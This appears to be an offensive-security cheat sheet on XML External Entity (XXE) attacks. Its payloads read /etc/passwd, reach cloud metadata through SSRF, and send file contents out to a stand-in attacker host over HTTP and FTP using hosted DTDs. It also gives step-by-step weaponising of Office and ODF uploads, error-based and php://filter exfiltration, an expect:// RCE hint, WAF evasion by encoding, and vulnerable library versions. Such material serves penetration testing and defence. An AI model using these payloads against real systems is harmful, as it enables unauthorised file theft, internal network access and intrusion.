---
tags:
  - Web
---

# :material-xml: XML External Entity (XXE)

<span class="pill pill-hard">file read + SSRF</span> <span class="pill pill-info">web</span>

If the server parses XML with external entities enabled, you can read local files, hit internal services, and sometimes reach RCE.

!!! abstract "TL;DR"
    Anywhere XML is accepted (SOAP, SAML, SVG, DOCX, `Content-Type: application/xml`), declare a `DOCTYPE` with an external entity and reference it in a value that gets reflected.

## :material-file-eye: Classic file read

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<root><name>&x;</name></root>
```

The parser inlines the file into `&x;`, which the app echoes back.

## :material-server-network: SSRF via XXE

```xml
<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">
```

Reach cloud metadata and internal hosts — see [SSRF](ssrf.md).

## :material-eye-off: Blind / OOB exfiltration

No reflection? Exfil via an external DTD you host:

```xml
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://ATTACKER/evil.dtd"> %ext; ]>
```

```dtd
<!-- evil.dtd -->
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % go "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER/?x=%f;'>">
%go; %send;
```

## :material-file-image: XXE via SVG

Upload an `.svg` with the same `DOCTYPE` — image thumbnailers and preview
generators parse it server-side.

!!! opsec "OOB leaves DNS/HTTP trails"
    Blind XXE beacons to your host — use a domain you control and expect it in the target's egress logs.

## :material-microsoft-office: XXE via Office documents

<span class="pill pill-hard">→ file read</span> <span class="pill pill-medium">upload-driven</span>

A `.docx`, `.xlsx` or `.pptx` is **a zip archive full of XML**. Anything
server-side that opens one — a converter, a thumbnailer, a bulk import, a
resume parser, an "export to PDF" — unzips it and hands those parts to an XML
parser. That parser is frequently the one nobody remembered to harden.

!!! abstract "TL;DR"
    `unzip` the document → paste a `DOCTYPE` into one of its XML parts →
    **`zip -u`** it back → upload. Use an external DTD so you can change the
    file you're reading without rebuilding the document every time.

### :material-target: Where to inject

The `DOCTYPE` goes immediately **after** the `<?xml … ?>` declaration and before
the root element. Which part you pick matters — different libraries parse
different parts, and some never touch the one you'd expect:

| Format | Parts worth trying |
| --- | --- |
| All OOXML | `[Content_Types].xml` — parsed *first* by almost every library, so it's the highest-hit target |
| DOCX | `word/document.xml`, `word/styles.xml`, `docProps/core.xml` |
| XLSX | `xl/workbook.xml`, `xl/sharedStrings.xml`, `xl/worksheets/sheet1.xml` |
| PPTX | `ppt/presentation.xml`, `ppt/slides/slide1.xml` |
| ODF (ODT/ODS/ODP/ODG) | `content.xml`, `styles.xml`, `META-INF/manifest.xml` |

Try `[Content_Types].xml` first. If the document is rejected as corrupt, the
app is validating it — move to a content part like `word/document.xml`, which
survives validation because it's *supposed* to hold arbitrary markup.

### :material-wrench: Build the file

```bash
# 1. Unpack
7z x -oXXE report.xlsx        # or: unzip report.xlsx -d XXE

# 2. Edit the target part (see the payload below)
vim XXE/xl/workbook.xml

# 3. Repack — IN PLACE, with zip -u
cd XXE && zip -r -u ../report.xlsx *
```

!!! bug "Repack with `zip -u`, not 7-Zip"
    `7z u` / `7za u` / `7zz` recompress the archive differently and most Office
    parsing libraries then refuse the file as invalid — you'll get a "corrupt
    document" error and conclude the payload failed when it never got parsed.
    Update the original archive in place with `zip -u` and change nothing else.

    **ODF has an extra rule:** the `mimetype` entry must be the *first* file in
    the archive and **stored uncompressed**. Rebuilding an `.odt` from scratch
    means:

    ```bash
    zip -X -0 poc.odt mimetype && zip -X -r poc.odt . -x mimetype
    ```

### :material-code-tags: The payload

Inline, for a target that reflects parsed content back to you:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<cdl>&xxe;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
```

Blind is the normal case, so go straight to an **external DTD**. Put the
`DOCTYPE` in `xl/workbook.xml` (or `[Content_Types].xml`):

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY><!ENTITY % asd SYSTEM "http://$ATTACKER:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
```

and host `xxe.dtd` on your box:

```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://$ATTACKER:2121/%d;'>">
```

The whole point of the remote DTD is that **you change the file you're reading
by editing `xxe.dtd`, not by rebuilding the document**. One upload, then iterate
on your own server.

!!! bug "Why FTP instead of HTTP"
    libxml2 is strict about what may appear in a URL and rejects newlines
    outright, along with `#`, `%`, `<`, `>`, `"` and backslash. Any multi-line
    file therefore dies on the way out over HTTP. Two ways round it:

    - **FTP** (as above) — a listener like `xxeserv` tolerates what HTTP won't.
    - **Base64 the file first** so the exfil string is URL-safe:

      ```xml
      <!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
      ```

    This is the single most common reason a "working" Office XXE returns the
    DTD fetch but never the second callback.

### :material-magnify: Where these land

- **Document converters** — DOCX → PDF, XLSX → CSV, "preview in browser"
- **Bulk import** — user/product/invoice upload that reads a spreadsheet
- **Resume and application parsers** — near-universally an unhardened library
- **Reporting and mail-merge** features that ingest a template you supply
- **Anything with a thumbnail** in a file manager or document store

Confirm the parse happens at all before you tune payloads: upload a document
whose only change is an entity pointing at your listener, and watch for the hit.

### :material-toolbox: Tooling

| Tool | Use |
| --- | --- |
| [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) | Embeds XXE payloads into DOCX/XLSX/PPTX, ODT/ODS/ODP/ODG, SVG, PDF, JPG, GIF |
| [docem](https://github.com/whitel1st/docem) | Bulk-generates documents with XXE and XSS payloads across many parts at once |
| [Office Open XML Editor](https://github.com/PortSwigger/office-open-xml-editor) | Burp extension — edit the XML inside an OOXML upload directly in Repeater |
| `xxeserv` | Small FTP server built for XXE exfiltration |

`docem` is the efficient opening move: it produces one document per injection
point, so you upload the set and see which part the target actually parses
instead of guessing.

!!! loot "Known-vulnerable libraries worth fingerprinting"
    - **Apache POI** — `XSSFExportToXml` allowed file read and SSRF before **4.1.1**.
    - **Apache XMLBeans** — vulnerable at **2.6.0 and below**; fixed in 3.0.0.
    - Any stack pinning an old **docx4j**, **PHPWord**, or a headless
      **LibreOffice** used for conversion.

    An error page or a `docProps` field that leaks the generating library and
    version tells you whether to expect this before you build a single payload.

## :material-alert-decagram: Edge cases & gotchas

=== "Error-based exfil"

    No output *and* no outbound network? Force the file contents into a **parse
    error** message. The external DTD you host:

    ```dtd
    <!ENTITY % f SYSTEM "file:///etc/passwd">
    <!ENTITY % go "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%f;'>">
    %go; %e;
    ```

    The parser tries to open `/nonexistent/<contents-of-passwd>` and prints the
    path — with the file inlined — in the error. Only works when errors are
    reflected to you.

=== "XInclude (no DOCTYPE control)"

    If the app embeds *your* XML into a larger document, you can't declare a
    `DOCTYPE` — but `XInclude` needs only a single element:

    ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>
    ```

    Common on SOAP endpoints that wrap your input server-side.

=== "PHP wrappers"

    On PHP with `php://` enabled, base64-wrap so binary/`<`-heavy source
    survives the parser, and read app source:

    ```xml
    <!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/index.php">
    ```

    `expect://id` can reach **RCE** if the `expect` extension is loaded (rare).

=== "SVG that renders"

    A single upload can hit XXE *and* stored XSS. Thumbnailers (ImageMagick,
    librsvg, headless Chromium) parse the SVG server-side:

    ```xml
    <svg xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/hostname"/>
    </svg>
    ```

!!! bug "Why your payload silently fails"
    - **Newlines & special chars** in the target file break the exfil URL. Read
      single-line files (`/etc/hostname`, `/proc/self/environ` is `\0`-delimited —
      wrap in a param entity, don't put it in a query string). For multi-line
      files use error-based or a `php://filter` base64 wrapper.
    - **You can't reference a parameter entity (`%x;`) inside the internal
      subset** in most parsers — that's why OOB payloads push the definition into
      an *external* DTD. General entities (`&x;`) are the opposite: fine in the
      body, not in declarations.
    - **`file:///path/` (trailing slash) on Java** lists the directory instead of
      erroring — handy for enumeration.
    - **Protocol support is language-specific:** Java historically supported
      `http/https/ftp/file/jar/netdoc`; PHP adds `php://`/`expect://`; .NET and
      libxml are stricter. `libxml >= 2.9` disables external entities by default,
      so modern PHP/Python often needs the parser to be explicitly mis-configured.
    - **`Content-Type` matters:** flip `application/json` → `application/xml` (or
      `text/xml`) and resend — many endpoints accept both and only the XML path is
      vulnerable.
    - **UTF-16/UTF-7 encoding** the whole body can slip a payload past a WAF that
      only greps ASCII `<!DOCTYPE`.

!!! warning "Billion Laughs — don't do it on prod"
    Nested entity expansion (`&lol9;`) is a memory-exhaustion DoS, not exfil. It
    can take the target down and is almost never in scope. Know it exists so you
    don't trigger it by accident.

## :material-link-variant: Related

- Pivots into [SSRF](ssrf.md) and cloud [AWS](../cloud/aws.md) metadata theft.
- Often lands in [File Upload](file-upload.md) (SVG/DOCX) flows — see the [File Upload checklist](../checklists/file-upload.md).
- Same container, different bug class: [Spreadsheet / Formula Injection](spreadsheet-injection.md).
- Reference: [PayloadsAllTheThings — XXE](https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/) · [HackTricks — XXE](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html).
- Reference: [PortSwigger XXE](https://portswigger.net/web-security/xxe).
